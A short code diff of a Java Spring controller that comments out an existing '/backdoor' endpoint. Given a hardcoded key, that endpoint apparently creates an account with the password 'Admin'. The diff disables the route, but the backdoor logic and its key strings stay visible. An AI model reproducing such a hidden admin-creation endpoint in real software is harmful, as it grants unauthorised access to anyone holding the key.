@@ -29,11 +29,12 @@ public class PageController {
     @Autowired
     UserRolesRepository userRolesRepository;
 
+    /*
     @RequestMapping("/backdoor")
     @ResponseBody
     public String addUser(Model model, @RequestParam(value="key") String key){
 
-        if(!key.equals("mm2299mm")){return "";}
+        if(!key.equals("secretKey")){return "";}
 
         BCryptPasswordEncoder bCryptPasswordEncoder =  new BCryptPasswordEncoder();
         String encoded_pass = bCryptPasswordEncoder.encode("Admin");
@@ -58,7 +59,7 @@ public class PageController {
 
         return "SUCCESS!";
     }
-
+     */
 
     @RequestMapping("/user")
     @PreAuthorize("hasRole('ROLE_USER')")
